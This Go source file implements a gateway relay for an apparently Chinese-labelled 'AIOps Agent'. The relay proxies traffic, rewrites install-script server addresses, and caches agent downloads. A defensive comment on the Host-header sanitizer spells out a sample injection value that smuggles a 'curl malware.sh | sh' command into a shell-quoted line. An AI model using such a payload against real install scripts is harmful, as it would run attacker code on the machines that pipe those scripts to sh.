package main

import (
	"io"
	"log"
	"log/slog"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

// runRelay starts the agent in gateway relay mode: it listens on a local port
// and reverse-proxies all requests to the upstream cloud server. Internal
// machines that can't reach the internet point their agents at this relay
// instead of the cloud — only the gateway machine needs internet access.
//
// Install scripts (/install.sh, /install.ps1) are intercepted so the SERVER
// address is rewritten to the relay's own address: internal machines fetch the
// script through the relay and auto-configure with the relay as their server,
// then download binaries and report metrics through the relay — zero manual
// configuration needed.
//
// v5.4.1: relaySecret is an optional shared secret that the relay injects as
// X-Relay-Secret on every proxied request. When configured on the upstream
// server, all agent-facing requests via the relay must carry this header.
func runRelay(listenAddr, upstream, relaySecret string) {
	target, err := url.Parse(upstream)
	if err != nil {
		log.Fatalf("Relay: 无效的上游地址 %q: %v", upstream, err)
	}

	proxy := httputil.NewSingleHostReverseProxy(target)
	// Flush promptly so streaming responses (terminal tx/rx, long-poll) feel real-time.
	proxy.FlushInterval = 100 * time.Millisecond
	// Custom transport with high MaxIdleConnsPerHost: the default transport keeps
	// only 2 idle connections per host, which causes TCP churn when many internal
	// agents report concurrently through the relay.
	proxy.Transport = relayTransport

	dlCache := newRelayDLCache(upstream, relaySecret)

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Intercept install scripts: rewrite SERVER to the relay's address so
		// internal machines auto-configure to connect through the relay.
		if r.URL.Path == "/install.sh" || r.URL.Path == "/install.ps1" {
			serveRelayInstallScript(w, r, upstream)
			return
		}
		// Intercept /dl/ downloads: cache the agent binary / plugins.zip on the
		// gateway so a fleet install of N internal machines hits the cloud ONCE
		// instead of N×7.5MB. Cache miss falls through to the normal proxy.
		if r.Method == http.MethodGet && strings.HasPrefix(r.URL.Path, "/dl/") {
			if dlCache.serve(w, r) {
				return
			}
		}
		// v5.4.1: inject shared secret for relay authentication
		if relaySecret != "" {
			r.Header.Set("X-Relay-Secret", relaySecret)
		}
		proxy.ServeHTTP(w, r)
	})

	slog.Info("╔══════════════════════════════════════════════════════╗")
	slog.Info("║  AIOps Agent — 网关中继模式 (Relay)                    ║")
	slog.Info("║  监听: " + listenAddr + "  上游: " + upstream + "  ║")
	slog.Info("╚══════════════════════════════════════════════════════╝")
	// Extract port for the install command hint: listenAddr may be ":8529",
	// "0.0.0.0:8529", or "127.0.0.1:8529" — the hint should always show :<port>.
	relayPort := listenAddr
	if _, port, err := net.SplitHostPort(listenAddr); err == nil && port != "" {
		relayPort = ":" + port
	} else if !strings.HasPrefix(listenAddr, ":") {
		relayPort = ":" + listenAddr
	}
	slog.Info("内网机器安装命令", "cmd", "curl -fsSL http://<本机IP>"+relayPort+"/install.sh | sh")

	// Warn when binding to all interfaces — the relay is reachable by anyone
	// on the network. For internet-exposed gateways, bind to the internal IP.
	if listenAddr == "" || strings.HasPrefix(listenAddr, ":") ||
		strings.HasPrefix(listenAddr, "0.0.0.0:") {
		slog.Warn("⚠ 监听地址绑定到所有网卡——如不需外部访问，建议用 --listen 192.168.x.x:8529 绑定到内网IP")
	}

	srv := &http.Server{
		Addr:              listenAddr,
		Handler:           handler,
		ReadHeaderTimeout: 10 * time.Second,
		// No Read/Write timeout: terminal streams and long-polls need unbounded duration.
	}
	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("Relay 启动失败: %v", err)
	}
}

// relayTransport is the custom transport for the reverse proxy. It raises
// MaxIdleConnsPerHost from the default 2 to 50 so concurrent internal agents
// reuse pooled connections instead of churning TCP handshakes.
var relayTransport = &http.Transport{
	MaxIdleConns:        100,
	MaxIdleConnsPerHost: 50,
	IdleConnTimeout:     90 * time.Second,
	ForceAttemptHTTP2:   true,
	DialContext: (&net.Dialer{
		Timeout:   10 * time.Second,
		KeepAlive: 30 * time.Second,
	}).DialContext,
}

// relayClient is used for the one-shot install-script fetch (small response,
// generated instantly — a 15s timeout is plenty).
var relayClient = &http.Client{Timeout: 15 * time.Second}

// serverLineRe matches the SERVER= / $Server = assignment line in install
// scripts, so the relay can rewrite the URL to its own address regardless of
// how the upstream rendered it (scheme, port, trailing slash, …).
var serverLineRe = regexp.MustCompile(`((?:SERVER|\$Server)\s*=\s*")[^"]+(")`)

// maxInstallScriptSize caps how much we read from the upstream when proxying
// install scripts. Real scripts are < 8 KB; anything larger is suspicious.
const maxInstallScriptSize = 256 * 1024

// sanitizeHost strips any character that could break out of a shell
// double-quoted string when the host is injected into an install script's
// SERVER="..." line. Without this, a crafted Host header like
// `x"; curl malware.sh | sh; echo "` would inject commands into the
// script that an internal machine pipes to sh.
func sanitizeHost(h string) string {
	return strings.Map(func(r rune) rune {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
			return r
		case r == '.' || r == ':' || r == '-' || r == '[' || r == ']':
			return r // IP addresses, ports, IPv6 brackets, domain hyphens
		default:
			return -1
		}
	}, h)
}

// serveRelayInstallScript proxies an install.sh / install.ps1 request to the
// upstream cloud server, then rewrites the SERVER address in the response body
// to the relay's own address (derived from the sanitized request Host header).
// Internal machines thus auto-configure to connect through the relay.
func serveRelayInstallScript(w http.ResponseWriter, r *http.Request, upstream string) {
	// Build the upstream URL (upstream is already normalized without trailing slash).
	upstreamURL := upstream + r.URL.Path
	if r.URL.RawQuery != "" {
		upstreamURL += "?" + r.URL.RawQuery
	}

	req, err := http.NewRequestWithContext(r.Context(), "GET", upstreamURL, nil)
	if err != nil {
		http.Error(w, "Relay: 构建请求失败", http.StatusInternalServerError)
		return
	}

	resp, err := relayClient.Do(req)
	if err != nil {
		http.Error(w, "Relay: 无法连接上游服务端 ("+upstream+")", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	// Cap the body: install scripts are tiny; a megabyte response means the
	// upstream is broken or malicious — don't buffer it all into memory.
	body, err := io.ReadAll(io.LimitReader(resp.Body, maxInstallScriptSize))
	if err != nil {
		http.Error(w, "Relay: 读取安装脚本失败", http.StatusInternalServerError)
		return
	}

	// Sanitize the Host header to prevent command injection via crafted Host.
	// Only hostname/IP/port characters survive; quotes, semicolons, backticks
	// etc. are stripped so they can never break out of the shell double-quoted
	// assignment in the install script.
	host := sanitizeHost(r.Host)
	if host == "" {
		http.Error(w, "Relay: 无效的 Host 头", http.StatusBadRequest)
		return
	}

	// Rewrite SERVER="..." (and $Server = "...") to the relay's address.
	relayURL := "http://" + host
	rewritten := serverLineRe.ReplaceAllString(string(body), "${1}"+relayURL+"${2}")

	// Copy content type + status.
	if ct := resp.Header.Get("Content-Type"); ct != "" {
		w.Header().Set("Content-Type", ct)
	}
	w.Header().Set("Content-Length", strconv.Itoa(len(rewritten)))
	w.WriteHeader(resp.StatusCode)
	_, _ = io.WriteString(w, rewritten)
}

// relayDLCacheTTL 是 /dl/ 缓存文件的新鲜期：期内直接从磁盘服务、不回源。装机通常是
// 短时间内一批机器并发拉取，10 分钟足以让整批命中同一份缓存，又不至于让新版 agent
// 长期拿不到（过期后单机回源刷新，上游的 ETag 让内容不变时只回 304）。
const relayDLCacheTTL = 10 * time.Minute

// relayDLCache caches /dl/ static artifacts (agent binaries, plugins.zip) on the
// gateway. It collapses a fleet install into a single upstream fetch and serves
// local copies with full Range support (http.ServeFile) for resumable downloads.
type relayDLCache struct {
	dir      string
	upstream string
	secret   string
	mu       sync.Mutex
	locks    map[string]*sync.Mutex // per-file lock: avoid thundering-herd on cold cache
}

func newRelayDLCache(upstream, secret string) *relayDLCache {
	dir := filepath.Join(os.TempDir(), "aiops-relay-dl-cache")
	_ = os.MkdirAll(dir, 0o755)
	return &relayDLCache{dir: dir, upstream: upstream, secret: secret, locks: map[string]*sync.Mutex{}}
}

func (c *relayDLCache) lockFor(name string) *sync.Mutex {
	c.mu.Lock()
	defer c.mu.Unlock()
	l := c.locks[name]
	if l == nil {
		l = &sync.Mutex{}
		c.locks[name] = l
	}
	return l
}

// serve returns true if it handled the request (from cache or a fresh fetch),
// false to let the caller fall through to the normal reverse proxy.
func (c *relayDLCache) serve(w http.ResponseWriter, r *http.Request) bool {
	name := path.Base(r.URL.Path)
	// Reject anything that isn't a plain filename (path traversal / directory).
	if name == "" || name == "." || name == "/" || strings.ContainsAny(name, `/\`) {
		return false
	}
	cf := filepath.Join(c.dir, name)

	// Fast path: fresh cache hit — serve straight from disk.
	if fi, err := os.Stat(cf); err == nil && !fi.IsDir() && time.Since(fi.ModTime()) < relayDLCacheTTL {
		http.ServeFile(w, r, cf)
		return true
	}

	// Slow path: fetch under a per-file lock so concurrent installers don't all
	// hit the cloud. Re-check freshness after acquiring the lock.
	lk := c.lockFor(name)
	lk.Lock()
	defer lk.Unlock()
	if fi, err := os.Stat(cf); err == nil && !fi.IsDir() && time.Since(fi.ModTime()) < relayDLCacheTTL {
		http.ServeFile(w, r, cf)
		return true
	}
	if err := c.fetch(r.URL.Path, cf); err != nil {
		slog.Warn("Relay /dl 缓存回源失败，回退直连代理", "file", name, "err", err)
		return false // fall through to proxy
	}
	slog.Info("Relay /dl 缓存已刷新", "file", name)
	http.ServeFile(w, r, cf)
	return true
}

// fetch downloads one artifact from the upstream server to a temp file, then
// atomically renames it into place so a partial download never serves corrupt bytes.
func (c *relayDLCache) fetch(urlPath, dst string) error {
	req, err := http.NewRequest("GET", c.upstream+urlPath, nil)
	if err != nil {
		return err
	}
	if c.secret != "" {
		req.Header.Set("X-Relay-Secret", c.secret)
	}
	resp, err := relayTransport.RoundTrip(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return &relayDLError{status: resp.StatusCode}
	}
	tmp, err := os.CreateTemp(c.dir, "dl-*.part")
	if err != nil {
		return err
	}
	tmpName := tmp.Name()
	if _, err := io.Copy(tmp, resp.Body); err != nil {
		tmp.Close()
		os.Remove(tmpName)
		return err
	}
	tmp.Close()
	return os.Rename(tmpName, dst)
}

type relayDLError struct{ status int }

func (e *relayDLError) Error() string { return "upstream status " + strconv.Itoa(e.status) }
